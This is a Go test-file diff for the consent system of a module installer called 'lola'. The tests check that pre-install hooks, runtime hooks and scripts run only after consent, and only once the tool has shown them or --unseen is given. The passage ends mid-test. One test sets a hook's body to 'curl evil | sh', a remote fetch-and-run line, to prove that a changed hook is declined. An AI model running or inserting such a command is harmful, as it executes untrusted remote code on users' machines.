@@ -2,6 +2,8 @@ package engine_test
 
 import (
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"errors"
 	"os"
 	"path/filepath"
@@ -21,6 +23,24 @@ import (
 )
 
 func ptr(k engine.TrustKinds) *engine.TrustKinds { return &k }
+
+// consentRun is the run a refusal for want of consent hints: what follows "then consent to it: " in
+// its first hint naming it; "" for none.
+func consentRun(err error) string {
+	for _, h := range errs.Hints(err) {
+		if _, run, ok := strings.Cut(h, "then consent to it: "); ok {
+			return run
+		}
+	}
+	return ""
+}
+
+// unshown is the hints of a refusal of what (this hook, this script) lola has not shown you, in
+// place of "then consent to it: <run>": the dry run that shows it, then run; or run with --unseen.
+func unshown(what, run string) []string {
+	return []string{"lola has not shown you " + what + "; see it with " + run + " -n, then consent to it: " + run,
+		"or add --unseen to consent without seeing it: " + run + " --unseen"}
+}
 
 // answer is a receipt that answers ok, or err.
 func answer(ok bool, err error) func([]engine.Consent) (bool, error) {
@@ -124,11 +144,12 @@ var _ = Describe("typed trust", func() {
 		kit("{pre-install: hooks/pre.sh}")
 		pull("kit")
 		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: k}})
-		Expect(err).To(MatchError("kit has a pre-install hook, and lola runs hooks only with your consent"))
+		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
 		// kit's new version is not in your cache, which a refused run leaves as it was: its folder
 		// shows it.
 		Expect(errs.Hints(err)).To(HaveExactElements("review it: lola info --project ./mods/kit --target claude-code",
-			MatchRegexp(`^then consent to it: lola sync --project --trust=entries,profiles,hooks --at kit=sha256:[0-9a-f]{64}$`)), "the consent pins the version shown")
+			MatchRegexp(`^lola has not shown you this hook; see it with lola sync --project --trust=entries,profiles,hooks --at kit=sha256:[0-9a-f]{64} -n, then consent to it: `),
+			MatchRegexp(`^or add --unseen to consent without seeing it: lola sync --project --trust=entries,profiles,hooks --at kit=sha256:[0-9a-f]{64} --unseen$`)), "the consent pins the version shown")
 		Expect(ran()).To(BeNil())
 		Expect(trusts("kit")).To(BeFalse())
 	})
@@ -227,7 +248,8 @@ var _ = Describe("typed trust", func() {
 				Display: []string{"--plain"}})
 			return err
 		}, "kit has a pre-install hook, and lola runs hooks only with your consent",
-			[]string{"review it: lola info --project ./mods/kit --target claude-code --plain", "then consent to it: lola sync --project --trust=entries,hooks --at kit=sha256:<digest> --plain"}),
+			append([]string{"review it: lola info --project ./mods/kit --target claude-code --plain"},
+				unshown("this hook", "lola sync --project --trust=entries,hooks --at kit=sha256:<digest> --plain")...)),
 		Entry("entries+hooks", func() error {
 			kit("{pre-install: hooks/pre.sh}")
 			pull("kit")
@@ -283,7 +305,7 @@ var _ = Describe("typed trust", func() {
 
 		_, err = e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}},
 			engine.Options{Targets: []string{"claude-code"}, Force: true})
-		Expect(err).To(MatchError("kit has a pre-install hook, and lola runs hooks only with your consent"))
+		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
 		Expect(ran()).To(BeNil())
 		Expect(consented()).To(BeEmpty())
 	})
@@ -333,8 +355,152 @@ var _ = Describe("typed trust", func() {
 		collect(batch)
 		writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": script + "true # changed after the answer\n"})
 		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Expect: batch}})
-		Expect(err).To(MatchError("kit has a pre-install hook, and lola runs hooks only with your consent"))
+		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
 		Expect(ran()).To(Equal([]string{"pre-install kit"}), "it did not run again")
+	})
+
+	It("a batch's equivalent command repeats no consent kind the collect pass was told no", func() {
+		deploy("true")
+		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n",
+			"mods/gate/hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo gate"}]}]}}`})
+		pull("deploy", "gate")
+		all := func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil }
+		batch := &engine.TrustBatch{}
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{Batch: batch,
+			AskRuntimeHooks: func(m string, _ []engine.RuntimeHook) (bool, error) { return m == "deploy", nil }}})
+		Expect(err).To(MatchError(engine.ErrBatched))
+
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{Expect: batch}})
+		Expect(err).NotTo(HaveOccurred())
+		status := map[string]string{}
+		for _, m := range res.Modules {
+			for _, h := range m.RuntimeHooks {
+				status[m.Name] = h.Status
+			}
+		}
+		Expect(status).To(Equal(map[string]string{"deploy": engine.RuntimeHooksGranted, "gate": engine.RuntimeHooksDeclined}))
+		Expect(res.Equivalent).To(BeEmpty(), "--trust=runtime-hooks would grant gate's, refused; without it deploy's are removed")
+	})
+
+	It("an equivalent command carries the consent kinds answered yes and pins no version for them, its module's version changed or not", func() {
+		kit("")
+		deploy("true")
+		pull("deploy")
+		all := func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil }
+		yes := func(string, []engine.RuntimeHook) (bool, error) { return true, nil }
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{AskRuntimeHooks: yes}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(res.Equivalent).To(Equal("lola sync --project --trust=entries,runtime-hooks"))
+
+		// deploy's consent is gone, its version the one installed: a yes still prints the command.
+		Expect(os.Remove(p.Consent)).To(Succeed())
+		pull("deploy", "kit")
+		res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{AskRuntimeHooks: yes}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(res.Modules).To(ContainElement(And(HaveField("Name", "deploy"),
+			HaveField("RuntimeHooks", HaveEach(HaveField("Status", engine.RuntimeHooksGranted))))))
+		Expect(res.Equivalent).To(Equal("lola sync --project --trust=entries,runtime-hooks"))
+	})
+
+	It("--at pins versions alone: a hook consent kind reaches the modules it does not pin too", func() {
+		kit("{post-install: hooks/post.sh}")
+		deploy("true")
+		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n",
+			"mods/gate/hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo gate"}]}]}}`})
+		pull("deploy", "gate", "kit")
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
+		Expect(err).NotTo(HaveOccurred())
+		led, err := ledger.Load(filepath.Join(proj, ".lola", "lock.json"))
+		Expect(err).NotTo(HaveOccurred())
+		at := func(names ...string) map[string]string {
+			out := map[string]string{}
+			for _, n := range names {
+				out[n] = led.Modules[n].Digest
+			}
+			return out
+		}
+		status := func(res *engine.SyncResult) map[string]string {
+			out := map[string]string{}
+			for _, m := range res.Modules {
+				for _, h := range m.RuntimeHooks {
+					out[m.Name] = h.Status
+				}
+			}
+			return out
+		}
+
+		// gate and kit are installed and unchanged, their hooks never consented to: --at deploy pins
+		// deploy's version, and --trust's consent reaches theirs as well.
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, At: at("deploy"),
+			Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks | engine.TrustRuntimeHooks, Unseen: true}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(status(res)).To(Equal(map[string]string{"deploy": engine.RuntimeHooksGranted, "gate": engine.RuntimeHooksGranted}))
+		Expect(ran()).To(Equal([]string{"post-install kit"}))
+	})
+
+	It("a consent hint after a run that showed no new version pins no version", func() {
+		deploy("true")
+		user := engine.Scope{Kind: target.User}
+		_, err := e.Install(ctx, user, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "deploy")}},
+			engine.Options{Targets: []string{"claude-code"}})
+		Expect(err).NotTo(HaveOccurred())
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: user})
+		Expect(err).NotTo(HaveOccurred())
+		var hint string
+		for _, f := range res.Findings {
+			if f.Code == "claude-code/runtime-hooks-declined" {
+				hint = f.Hint
+			}
+		}
+		Expect(hint).To(HaveSuffix("consent to them: lola sync --user --trust=runtime-hooks"))
+	})
+
+	It("a partial answer's equivalent command names the modules it accepted, and does what the answer did", func() {
+		kit("")
+		pull("kit")
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
+		Expect(err).NotTo(HaveOccurred())
+		deploy("true")
+		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n"})
+		pull("kit", "deploy", "gate")
+		deployOnly := func(engine.TrustReport) (engine.TrustAnswer, error) {
+			return engine.TrustAnswer{Modules: []string{"deploy"}}, nil
+		}
+		yes := func(string, []engine.RuntimeHook) (bool, error) { return true, nil }
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: deployOnly, Options: engine.Options{AskRuntimeHooks: yes}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(res.Equivalent).To(Equal("lola sync --project deploy --trust=entries,runtime-hooks"))
+	})
+
+	It("a dry run's consent hint also trusts the changes it shows, so it works as printed", func() {
+		deploy("true")
+		pull("deploy")
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
+			HaveField("Hint", MatchRegexp(`consent to them: lola sync --project --trust=entries,runtime-hooks --at deploy=sha256:[0-9a-f]{64}$`)))))
+	})
+
+	It("an equivalent command never carries a consent kind with an item nobody was asked about", func() {
+		kit("")
+		pull("kit")
+		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
+		Expect(err).NotTo(HaveOccurred())
+		// A record-only change (the targets kit has already) installs no copy, so the post-install
+		// script, with nothing to wrap, is not asked about.
+		writeTree(proj, map[string]string{
+			".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\npost_install: ci/post.sh\nmodules:\n" +
+				"  - {name: kit, source: ./mods/kit, targets: [claude-code]}\n",
+			"ci/pre.sh": script, "ci/post.sh": script})
+		Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
+		Expect(os.Chmod(filepath.Join(proj, "ci", "post.sh"), 0o755)).To(Succeed())
+		var asked []string
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc,
+			Trust:   func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil },
+			Options: engine.Options{AskScript: func(q engine.ScriptQuestion) (bool, error) { asked = append(asked, q.Event); return true, nil }}})
+		Expect(err).NotTo(HaveOccurred())
+		Expect(asked).To(Equal([]string{engine.PreInstall}))
+		Expect(res.Equivalent).To(BeEmpty(), "--trust=scripts would grant the post-install script, never asked about")
 	})
 
 	It("a dry run's command adds exactly the trust kinds the run needs", func() {
@@ -352,7 +518,7 @@ var _ = Describe("typed trust", func() {
 	DescribeTable("consent given by --trust is recorded as a yes at the prompt is, for every kind, and a changed digest or view asks again",
 		func(given engine.TrustKinds, setup func(), change func(), asked func(*int) engine.SyncRequest) {
 			setup()
-			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: given}})
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: given, Unseen: true}})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.Trusted).NotTo(BeEmpty())
 
@@ -411,7 +577,7 @@ var _ = Describe("typed trust", func() {
 	It("a dry run with --trust records no consent", func() {
 		kit("{pre-install: hooks/pre.sh}")
 		pull("kit")
-		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true, Trust: engine.TrustEntries | engine.TrustHooks}})
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true, Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true}})
 		Expect(err).NotTo(HaveOccurred())
 		Expect(res.Trusted).To(ConsistOf(engine.Consent{Kind: "entries", Item: "targets", Change: engine.ConsentNew},
 			engine.Consent{Kind: "entries", Item: "kit", Change: engine.ConsentNew},
@@ -435,16 +601,16 @@ var _ = Describe("typed trust", func() {
 			Expect(ran()).To(BeNil())
 			Expect(filepath.Join(proj, ".claude")).NotTo(BeADirectory())
 		},
-		Entry("No", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Receipt: answer(false, nil)}, engine.ErrDeclined),
-		Entry("a refusal for another kind", engine.Options{Trust: engine.TrustHooks, Receipt: answer(true, nil)},
+		Entry("No", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: answer(false, nil)}, engine.ErrDeclined),
+		Entry("a refusal for another kind", engine.Options{Trust: engine.TrustHooks, Unseen: true, Receipt: answer(true, nil)},
 			"lola sync needs your trust for .lola/project.yml, which has not been trusted on this machine, and there is no terminal to ask on"),
-		Entry("Ctrl+C", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Receipt: answer(false, context.Canceled)}, context.Canceled),
+		Entry("Ctrl+C", engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: answer(false, context.Canceled)}, context.Canceled),
 		Entry("a terminal yes, then No at the receipt", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit", "kit2"),
 			Receipt: answer(false, nil)}, engine.ErrDeclined),
 		Entry("a terminal yes, then Ctrl+C at the receipt", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit", "kit2"),
 			Receipt: answer(false, context.Canceled)}, context.Canceled),
 		Entry("a terminal yes, then a refusal of another module's hook", engine.Options{Trust: engine.TrustEntries, Ask: askYes("kit"),
-			Receipt: answer(true, nil)}, "kit2 has a pre-install hook, and lola runs hooks only with your consent"),
+			Receipt: answer(true, nil)}, HavePrefix("kit2 has a pre-install hook, and lola runs hooks only with your consent: ")),
 	)
 
 	It("an error showing the --trust record ends the sync before the receipt, recording nothing", func() {
@@ -452,7 +618,7 @@ var _ = Describe("typed trust", func() {
 		pull("kit")
 		receipts := 0
 		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Show: func(engine.TrustReport) error { return context.Canceled },
-			Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Receipt: func([]engine.Consent) (bool, error) { receipts++; return true, nil }}})
+			Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true, Receipt: func([]engine.Consent) (bool, error) { receipts++; return true, nil }}})
 		Expect(err).To(MatchError(context.Canceled))
 		Expect(receipts).To(BeZero())
 		Expect(consented()).To(BeEmpty())
@@ -465,7 +631,7 @@ var _ = Describe("typed trust", func() {
 		kit("{pre-install: hooks/pre.sh}")
 		pull("kit")
 		var got []engine.Consent
-		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustAll, Receipt: receipt(true, &got)}})
+		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustAll, Unseen: true, Receipt: receipt(true, &got)}})
 		Expect(err).NotTo(HaveOccurred())
 		want := []engine.Consent{{Kind: "entries", Item: "targets", Change: engine.ConsentNew}, {Kind: "entries", Item: "kit", Change: engine.ConsentNew},
 			{Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}}
@@ -473,6 +639,284 @@ var _ = Describe("typed trust", func() {
 		Expect(res.Trusted).To(Equal(want))
 		Expect(ran()).To(Equal([]string{"pre-install kit"}))
 		Expect(trusts("kit")).To(BeTrue())
+	})
+
+	Describe("shown-only consent", func() {
+		// show records every consent item of res as shown, as the CLI does once it prints the report.
+		show := func(res *engine.Result) {
+			GinkgoHelper()
+			Expect(e.Shown.Add(res.ShownKeys()...)).To(Succeed())
+		}
+		hooksOf := func(res *engine.SyncResult, module string) []engine.RuntimeHook {
+			for _, m := range res.Modules {
+				if m.Name == module {
+					return m.RuntimeHooks
+				}
+			}
+			return nil
+		}
+		hookTrust := engine.Options{Trust: engine.TrustEntries | engine.TrustRuntimeHooks}
+
+		It("a consent kind grants runtime hooks lola has shown you, and declines the rest off a terminal with how to see them", func() {
+			deploy("true")
+			pull("deploy")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksDeclined), HaveField("New", HaveValue(BeTrue())))))
+			Expect(consented()).NotTo(ContainSubstring("deploy/runtime-hooks/"))
+			Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
+				HaveField("Hint", MatchRegexp(`^lola has not shown you these hooks; see them with lola sync --project --trust=entries,runtime-hooks --at deploy=(sha256:[0-9a-f]{64}) -n, `+
+					`then run this again, or add --unseen to consent without seeing them: lola sync --project --trust=entries,runtime-hooks --at deploy=sha256:[0-9a-f]{64} --unseen$`)))))
+
+			show(res.Result)
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
+			Expect(consented()).To(ContainSubstring("deploy/runtime-hooks/"))
+		})
+
+		It("a runtime hook changed after lola showed it is declined again", func() {
+			deploy("true")
+			pull("deploy")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			show(res.Result)
+			deploy("curl evil | sh")
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)))
+			Expect(consented()).NotTo(ContainSubstring("deploy/runtime-hooks/"))
+		})
+
+		It("--unseen widens a consent kind to what lola has not shown you; --force grants nothing", func() {
+			deploy("true")
+			pull("deploy")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Force: true}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksDeclined)))
+			Expect(res.Findings).To(ContainElement(HaveField("Hint", ContainSubstring("--unseen"))))
+
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Unseen: true}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksGranted), HaveField("New", HaveValue(BeTrue())))))
+		})
+
+		It("a dry run grants what it shows you, as the run after it will, and records nothing", func() {
+			deploy("true")
+			pull("deploy")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, DryRun: true}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
+			Expect(e.Shown.Holds(res.ShownKeys()...)).To(BeFalse(), "the CLI records what it printed")
+			Expect(consented()).To(BeEmpty())
+		})
+
+		It("a hook a terminal question showed counts as shown, and one answered no is not asked again until it changes", func() {
+			deploy("true")
+			pull("deploy")
+			asked := 0
+			no := engine.Options{Trust: engine.TrustEntries, AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }}
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(Equal(1))
+			Expect(e.Shown.Holds(res.ShownKeys()...)).To(BeTrue(), "the question showed them")
+
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(Equal(1), "declined earlier, not asked again")
+			Expect(hooksOf(res, "deploy")).To(HaveEach(And(HaveField("Status", engine.RuntimeHooksDeclined),
+				HaveField("DeclinedEarlier", BeTrue()), HaveField("New", HaveValue(BeFalse())))))
+			Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
+				HaveField("Hint", HaveSuffix("consent to them: lola sync --project --trust=entries,runtime-hooks")))))
+
+			res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: hookTrust})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)), "the hint works as printed")
+			deploy("echo changed")
+			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: no})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(Equal(2), "its content changed")
+		})
+
+		It("a batch's apply pass grants, by --trust, the hooks its collect pass showed in a question", func() {
+			deploy("true")
+			pull("deploy")
+			asked := 0
+			yes := func(string, []engine.RuntimeHook) (bool, error) { asked++; return true, nil }
+			batch := &engine.TrustBatch{}
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Batch: batch, AskRuntimeHooks: yes}})
+			Expect(err).To(MatchError(engine.ErrBatched))
+			Expect(asked).To(Equal(1), "unseen, so asked on the terminal, which shows them")
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: hookTrust.Trust, Expect: batch}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("Status", engine.RuntimeHooksGranted)))
+			Expect(consented()).To(ContainSubstring("deploy/runtime-hooks/"))
+		})
+
+		It("a No in a batch's collect pass is not asked again, as a No at a question", func() {
+			deploy("true")
+			pull("deploy")
+			asked := 0
+			no := func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }
+			batch := &engine.TrustBatch{}
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Batch: batch, AskRuntimeHooks: no}})
+			Expect(err).To(MatchError(engine.ErrBatched))
+			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Expect: batch}})
+			Expect(err).NotTo(HaveOccurred())
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, AskRuntimeHooks: no}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(Equal(1))
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("DeclinedEarlier", BeTrue())))
+		})
+
+		It("hooks declined where nothing asked are asked about on a later terminal run", func() {
+			deploy("true")
+			pull("deploy")
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
+			Expect(err).NotTo(HaveOccurred())
+			asked := 0
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries,
+				AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { asked++; return false, nil }}})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(asked).To(Equal(1), "no one answered the off-terminal decline")
+			Expect(hooksOf(res, "deploy")).To(HaveEach(HaveField("DeclinedEarlier", BeFalse())))
+		})
+
+		It("a pre-install hook lola has not shown you is refused, recording nothing; the dry run it hints shows its body", func() {
+			kit("{pre-install: hooks/pre.sh}")
+			opts := engine.Options{Targets: []string{"claude-code"}, Trust: engine.TrustHooks}
+			install := func(o engine.Options) (*engine.Result, error) {
+				return e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}}, o)
+			}
+			_, err := install(opts)
+			Expect(err).To(MatchError(MatchRegexp(`^kit has a pre-install hook lola had not shown you: pre-install: hooks/pre\.sh \(sha256 [0-9a-f]{64}\)$`)))
+			Expect(errs.Hints(err)).To(ContainElements(
+				HavePrefix("lola has not shown you this hook; see it with lola install --project "),
+				HavePrefix("or add --unseen to consent without seeing it: lola install --project ")))
+			Expect(p.Shown).NotTo(BeAnExistingFile(), "a path and a sha256 are not the hook")
+			_, err = install(opts)
+			Expect(err).To(HaveOccurred(), "refused again")
+			Expect(ran()).To(BeNil())
+
+			dry := opts
+			dry.DryRun = true
+			res, err := install(dry)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", script), HaveField("New", HaveValue(BeTrue())))))
+			show(res)
+			_, err = install(opts)
+			Expect(err).NotTo(HaveOccurred())
+			Expect(ran()).To(Equal([]string{"pre-install kit"}))
+		})
+
+		It("a project's pre-install script lola has not shown you is refused, recording nothing; the dry run it hints shows its body", func() {
+			kit("")
+			pull("kit")
+			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\nmodules:\n" +
+				"  - {name: kit, source: ./mods/kit}\n", "ci/pre.sh": script})
+			Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
+			trust := engine.Options{Trust: engine.TrustEntries | engine.TrustScripts}
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
+			Expect(err).To(MatchError(MatchRegexp(`pre-install script ci/pre\.sh \(sha256 [0-9a-f]{64}\) of this project`)))
+			Expect(errs.Hints(err)).To(ContainElements(
+				MatchRegexp(`^lola has not shown you this script; see it with lola sync --project --trust=entries,scripts( --at kit=sha256:[0-9a-f]{64})? -n, then run this again$`),
+				HavePrefix("or add --unseen to consent without seeing it: lola sync --project --trust=entries,scripts")))
+			Expect(p.Shown).NotTo(BeAnExistingFile())
+			Expect(ran()).To(BeNil())
+
+			dry := trust
+			dry.DryRun = true
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: dry})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Scripts).To(HaveEach(And(HaveField("Body", script), HaveField("New", HaveValue(BeTrue())))))
+			show(res.Result)
+			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(ran()).To(Equal([]string{"pre-install kit"}))
+		})
+
+		It("a sync with nothing to install lists the project's pre-install script in a dry run, so its hint shows it", func() {
+			kit("")
+			pull("kit")
+			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
+			Expect(err).NotTo(HaveOccurred())
+			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\nmodules:\n" +
+				"  - {name: kit, source: ./mods/kit}\n", "ci/pre.sh": script})
+			Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
+			trust := engine.Options{Trust: engine.TrustEntries | engine.TrustScripts}
+			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
+			Expect(err).To(MatchError(ContainSubstring("lola had not shown it to you")))
+			dry := trust
+			dry.DryRun = true
+			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: dry})
+			Expect(err).NotTo(HaveOccurred())
+			Expect(res.Scripts).To(ConsistOf(And(HaveField("Status", engine.HookLater), HaveField("Module", ""), HaveField("Body", script))))
+			show(res.Result)
+			_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: trust})
+			Expect(err).NotTo(HaveOccurred())
+		})
+
+		DescribeTable("a hook too large or not text is never shown: its body is withheld, and only --unseen consents to it",
+			func(body, why string) {
+				kit("{pre-install: hooks/pre.sh}")
+				writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": body})
+				opts := engine.Options{Targets: []string{"claude-code"}, Trust: engine.TrustHooks}
+				install := func(o engine.Options) (*engine.Result, error) {
+					return e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}}, o)
+				}
+				dry := opts
+				dry.DryRun = true
+				res, err := install(dry)
+				Expect(err).NotTo(HaveOccurred())
+				Expect(res.Modules[0].Hooks).To(HaveEach(And(HaveField("Body", ""), HaveField("Withheld", why),
+					HaveField("Inspect()", HaveSuffix("/hooks/pre.sh")))))
+				Expect(res.Trusted).To(BeEmpty(), "a dry run grants nothing it cannot show")
+				show(res)
+				_, err = install(opts)
+				Expect(err).To(HaveOccurred())
+				Expect(errs.Hints(err)).To(ContainElement(MatchRegexp(`^lola cannot show you this hook \(` + strings.ReplaceAll(why, "_", " ") +
+					`\); inspect .*/hooks/pre\.sh, then consent to it unseen: lola install .* --unseen$`)))
+				opts.Unseen = true
+				_, err = install(opts)
+				Expect(err).NotTo(HaveOccurred())
+			},
+			Entry("too large", "#!/bin/sh\n"+strings.Repeat("# filler\n", 8<<10), engine.BodyTooLarge),
+			Entry("not text", "#!/bin/sh\nexit 0\n\x00", engine.BodyNotText),
+		)
+
+		It("a body keeps its bytes: a tab is a tab, and the sha256 is the file's", func() {
+			kit("{pre-install: hooks/pre.sh}")
+			writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": "#!/bin/sh\n\techo tab\n"})
